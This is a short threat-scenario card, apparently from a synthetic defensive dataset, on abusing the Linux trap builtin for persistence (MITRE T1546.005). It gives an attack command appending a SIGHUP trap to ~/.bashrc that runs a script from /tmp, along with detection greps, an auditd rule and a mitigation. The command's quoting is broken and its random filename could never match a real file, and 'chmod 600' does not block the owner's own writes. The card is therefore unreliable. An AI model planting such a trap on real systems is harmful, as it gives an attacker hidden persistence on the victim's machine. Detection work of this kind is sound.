---
type: campaign
scenario_id: 350
tactic: Persistence
technique: "T1546.005: Trap"
technique_id: T1546.005
tags: [campaign, lotl, persistence]
---

# Abusing trap command locally for persistence on Linux.

## Threat Description
Abusing trap command locally for persistence on Linux.

## Attack Command
```
echo 'trap "/bin/bash -c \"/tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\"" SIGHUP' >> ~/.bashrc
```

## Detection Logic
Monitor trap in bashrc: `cat ~/.bashrc | grep trap | grep tmp`; Audit file changes: `auditctl -w ~/.bashrc -p wa`.

## Mitigation
Restrict bashrc writes: `chmod 600 ~/.bashrc`; Monitor shell configuration changes.

## AI Training Prompt
Train AI to detect local trap tampering in bashrc and suggest file protections.

## References
- MITRE ATT&CK T1546.005: https://attack.mitre.org/techniques/T1546/005/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
